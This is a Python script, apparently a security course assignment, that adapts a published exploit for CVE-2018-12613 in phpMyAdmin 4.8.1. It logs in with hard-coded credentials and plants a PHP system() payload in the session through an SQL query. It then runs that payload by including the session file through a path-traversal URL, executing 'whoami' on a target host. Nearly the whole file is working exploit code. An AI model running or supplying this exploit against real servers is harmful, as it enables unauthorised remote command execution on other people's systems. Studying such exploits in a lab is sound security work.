# Ryan Cheevers-Brown
# Assignment 4 - Web Application Security
# 11/01/2023
# Original Exploit Author: samguy
# Vulnerability Doscivery By: ChaMd5 & Henry Huang
# Software: PHPMyAdmin 4.8.1
# CVE: CVE-2018-12613



import re, requests, sys, html

def get_token(content):
    s = re.search('"token" value="(.*)"', content)
    if s != None:
        token = html.unescape(s.group(1))
        return token
    print(f"tokenizing failed, {content}")
    exit()

url = "http://172.16.95.142"

url1 = url + "/index.php"
r = requests.get(url)

content = r.content.decode('utf-8')
cookies = r.cookies
token = get_token(content)

user = "pma"
passw = "pmapass"

p = {'token':token, 'pma_username':user, 'pma_password':passw}
r = requests.post(url, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+)', content)
if s != None:
    logged_in = s.group(1)
else:
    print("something fucky")
    exit()
if logged_in == "false":
    print(f"Authentication Failed, {content}")
    exit()
    
cookies = r.cookies

token = get_token(content)

url2 = url+"/import.php"

command = "whoami"

payload = '''select '<?php system("{}") ?>';'''.format(command)

p = {'table':'', 'token':token, 'sql_query':payload}

r = requests.post(url2, cookies = cookies, data = p)

if r.status_code != 200:
    print("query failed")
    exit()

session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)
if r.status_code != 200:
    print("execution failed")
    exit()

content = r.content.decode('utf-8', errors='replace')
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s != None:
    print(s.group(1))